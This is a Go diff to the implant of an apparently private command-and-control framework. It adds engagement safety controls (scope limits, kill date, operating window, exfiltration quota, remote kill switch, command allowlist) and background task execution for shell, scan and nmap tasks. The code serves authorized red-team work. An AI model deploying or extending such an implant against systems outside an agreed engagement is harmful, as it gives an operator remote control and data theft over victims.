@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"io"
@@ -15,12 +16,23 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
 
+	"github.com/azizbinmohammad/private-c2/implant/safety"
+	"github.com/azizbinmohammad/private-c2/implant/task"
+	"github.com/azizbinmohammad/private-c2/pkg/engagement"
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
 	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
+)
+
+var (
+	agentSafety    *safety.SafetyChecker
+	agentAllowlist *safety.CommandAllowlist
+
+	errKillSwitch = errors.New("kill switch activated")
 )
 
 func sendMessage(conn net.Conn, msg *protocol.Message) error {
@@ -127,7 +139,35 @@ func main() {
 	certPath := flag.String("cert", "", "path to client certificate PEM presented to the server (required when the listener enforces mTLS)")
 	keyPath := flag.String("key", "", "path to client private key PEM")
 	insecure := flag.Bool("insecure", false, "skip server certificate verification (development only)")
+
+	engagementID := flag.String("engagement-id", "", "engagement identifier used by safety checks")
+	scopeCIDRs := flag.String("scope-cidrs", "", "comma-separated CIDR ranges allowed by the engagement")
+	scopeHosts := flag.String("scope-hosts", "", "comma-separated hostnames allowed by the engagement")
+	scopeDomains := flag.String("scope-domains", "", "comma-separated domain suffixes allowed by the engagement")
+	killDateRaw := flag.String("kill-date", "", "RFC3339 time after which the implant must stop")
+	windowStart := flag.String("window-start", "", "RFC3339 start of the allowed operating window")
+	windowEnd := flag.String("window-end", "", "RFC3339 end of the allowed operating window")
+	dataQuotaBytes := flag.Int64("data-quota-bytes", 0, "maximum bytes the implant may exfiltrate (0 = unlimited)")
+	remoteKillURL := flag.String("remote-kill-url", "", "URL polled for a remote kill signal (fail-closed when unreachable)")
+	safeMode := flag.Bool("safe-mode", false, "enforce the read-only command allowlist")
 	flag.Parse()
+
+	var err error
+	agentSafety, agentAllowlist, err = buildSafety(safetyConfig{
+		EngagementID:  *engagementID,
+		CIDRs:         *scopeCIDRs,
+		Hosts:         *scopeHosts,
+		Domains:       *scopeDomains,
+		KillDate:      *killDateRaw,
+		WindowStart:   *windowStart,
+		WindowEnd:     *windowEnd,
+		DataQuota:     *dataQuotaBytes,
+		RemoteKillURL: *remoteKillURL,
+		SafeMode:      *safeMode,
+	})
+	if err != nil {
+		log.Fatalf("safety configuration: %v", err)
+	}
 
 	if *serverAddr == "" {
 		fmt.Fprintf(os.Stderr, "error: --server is required\n")
@@ -196,6 +236,10 @@ func main() {
 		if ctx.Err() != nil {
 			return
 		}
+		if errors.Is(err, errKillSwitch) {
+			log.Printf("terminating: %v", err)
+			return
+		}
 		if err != nil {
 			log.Printf("beacon loop error: %v (reconnecting in %v)", err, backoff)
 			select {
@@ -211,8 +255,164 @@ func main() {
 	}
 }
 
+type safetyConfig struct {
+	EngagementID  string
+	CIDRs         string
+	Hosts         string
+	Domains       string
+	KillDate      string
+	WindowStart   string
+	WindowEnd     string
+	DataQuota     int64
+	RemoteKillURL string
+	SafeMode      bool
+}
+
+// buildSafety constructs the implant-side safety checker from flags. An empty
+// configuration yields a checker that passes, preserving development flow;
+// configured constraints fail closed.
+func buildSafety(cfg safetyConfig) (*safety.SafetyChecker, *safety.CommandAllowlist, error) {
+	var scope *engagement.Scope
+	cidrs, hosts, domains := splitList(cfg.CIDRs), splitList(cfg.Hosts), splitList(cfg.Domains)
+	if len(cidrs) > 0 || len(hosts) > 0 || len(domains) > 0 {
+		s, err := engagement.NewScope(cidrs, hosts, domains, nil)
+		if err != nil {
+			return nil, nil, err
+		}
+		scope = s
+	}
+
+	var killDate time.Time
+	if cfg.KillDate != "" {
+		t, err := time.Parse(time.RFC3339, cfg.KillDate)
+		if err != nil {
+			return nil, nil, fmt.Errorf("kill date: %w", err)
+		}
+		killDate = t
+	}
+
+	var window *engagement.TimeWindow
+	if cfg.WindowStart != "" || cfg.WindowEnd != "" {
+		if cfg.WindowStart == "" || cfg.WindowEnd == "" {
+			return nil, nil, fmt.Errorf("both window-start and window-end are required")
+		}
+		start, err := time.Parse(time.RFC3339, cfg.WindowStart)
+		if err != nil {
+			return nil, nil, fmt.Errorf("window start: %w", err)
+		}
+		end, err := time.Parse(time.RFC3339, cfg.WindowEnd)
+		if err != nil {
+			return nil, nil, fmt.Errorf("window end: %w", err)
+		}
+		window = &engagement.TimeWindow{Start: start, End: end}
+	}
+
+	var quota *engagement.DataQuota
+	if cfg.DataQuota > 0 {
+		quota = engagement.NewDataQuota(cfg.DataQuota)
+	}
+
+	killSwitch := engagement.NewKillSwitch()
+	checker := safety.NewSafetyChecker(safety.SafetyConfig{
+		KillSwitch:    killSwitch,
+		EngagementID:  cfg.EngagementID,
+		KillDate:      killDate,
+		TimeWindow:    window,
+		Scope:         scope,
+		DataQuota:     quota,
+		RemoteKillURL: cfg.RemoteKillURL,
+	})
+
+	var allowlist *safety.CommandAllowlist
+	if cfg.SafeMode {
+		allowlist = safety.NewCommandAllowlist()
+		allowlist.Enable()
+	}
+	return checker, allowlist, nil
+}
+
+func splitList(raw string) []string {
+	if strings.TrimSpace(raw) == "" {
+		return nil
+	}
+	parts := strings.Split(raw, ",")
+	out := make([]string, 0, len(parts))
+	for _, p := range parts {
+		if v := strings.TrimSpace(p); v != "" {
+			out = append(out, v)
+		}
+	}
+	return out
+}
+
+// taskTarget extracts the network target a task will act on, when it has one.
+func taskTarget(t protocol.TaskWire) string {
+	switch t.Type {
+	case protocol.TaskPortscan:
+		target, _, err := parsePortscanArgs(t.Args)
+		if err == nil {
+			return target
+		}
+	case protocol.TaskResolve:
+		return strings.TrimSpace(t.Args)
+	case protocol.TaskScan:
+		var req struct {
+			Target string `json:"target"`
+		}
+		if err := json.Unmarshal([]byte(t.Args), &req); err == nil {
+			return strings.TrimSpace(req.Target)
+		}
+	case protocol.TaskNmap:
+		fields := strings.Fields(t.Args)
+		for i := len(fields) - 1; i >= 0; i-- {
+			if !strings.HasPrefix(fields[i], "-") {
+				return fields[i]
+			}
+		}
+	}
+	return ""
+}
+
+func checkTaskSafety(ctx context.Context, t protocol.TaskWire) error {
+	if agentAllowlist != nil && agentAllowlist.IsEnabled() && t.Type == protocol.TaskShell {
+		if ok, reason := agentAllowlist.IsAllowed(t.Args); !ok {
+			return fmt.Errorf("refused by command allowlist: %s", reason)
+		}
+	}
+	if agentSafety == nil {
+		return nil
+	}
+	result := agentSafety.CheckWithTarget(ctx, taskTarget(t))
+	if !result.Passed {
+		return fmt.Errorf("refused by safety policy: %s", result.Reason)
+	}
+	return nil
+}
+
 func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval time.Duration, jitter float64) error {
+	// Tasks run on background workers so a long scan or shell command does not
+	// stop the implant from checking in. Results are flushed at the start of
+	// each cycle.
+	runner := task.NewRunner(func(ctx context.Context, t protocol.TaskWire) (string, error) {
+		return handleTask(ctx, t)
+	}, task.RunnerConfig{SafetyCheck: checkTaskSafety})
+	defer runner.Close()
+
 	for {
+		if agentSafety != nil {
+			check := agentSafety.Check(ctx)
+			if !check.Passed {
+				log.Printf("safety check failed: %s", check.Reason)
+				if check.Fatal {
+					return errKillSwitch
+				}
+			}
+		}
+
+		if err := flushResults(conn, sessionID, runner); err != nil {
+			return err
+		}
+
 		sleepWithJitter(interval, jitter)
 
 		if ctx.Err() != nil {
@@ -243,35 +443,42 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 			log.Printf("unmarshal tasking: %v", err)
 			continue
 		}
+		if tasking.Kill {
+			log.Printf("server ordered kill: %s", tasking.KillReason)
+			return nil
+		}
 
-		// Execute tasks.
-		for _, task := range tasking.Tasks {
-			output, taskErr := handleTask(ctx, task)
-
-			result := protocol.ResultData{
-				SessionID: sessionID,
-				TaskID:    task.ID,
-				Success:   taskErr == nil,
-				Output:    output,
-			}
-			if taskErr != nil {
-				result.Error = taskErr.Error()
-				// Still include any partial output.
-			}
-
-			resultJSON, _ := json.Marshal(result)
-			if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
-				return fmt.Errorf("send result: %w", err)
-			}
-
-			// Read result_ack.
-			ack, err := readMessage(conn)
-			if err != nil {
-				return fmt.Errorf("read result_ack: %w", err)
-			}
-			if ack.Type != "result_ack" {
-				log.Printf("expected result_ack, got %s", ack.Type)
+		for _, t := range tasking.Tasks {
+			if !runner.Submit(t) {
+				log.Printf("duplicate or invalid task ignored: %s", t.ID)
 			}
 		}
 	}
+}
+
+// flushResults sends every completed task result and waits for its ack.
+func flushResults(conn net.Conn, sessionID string, runner *task.Runner) error {
+	for _, res := range runner.Drain() {
+		result := protocol.ResultData{
+			SessionID: sessionID,
+			TaskID:    res.TaskID,
+			Success:   res.Success,
+			Output:    res.Output,
+			Error:     res.Error,
+			Truncated: res.Truncated,
+			Bytes:     res.Bytes,
+		}
+		resultJSON, _ := json.Marshal(result)
+		if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
+			return fmt.Errorf("send result: %w", err)
+		}
+		ack, err := readMessage(conn)
+		if err != nil {
+			return fmt.Errorf("read result_ack: %w", err)
+		}
+		if ack.Type != "result_ack" {
+			log.Printf("expected result_ack, got %s", ack.Type)
+		}
+	}
+	return nil
 }
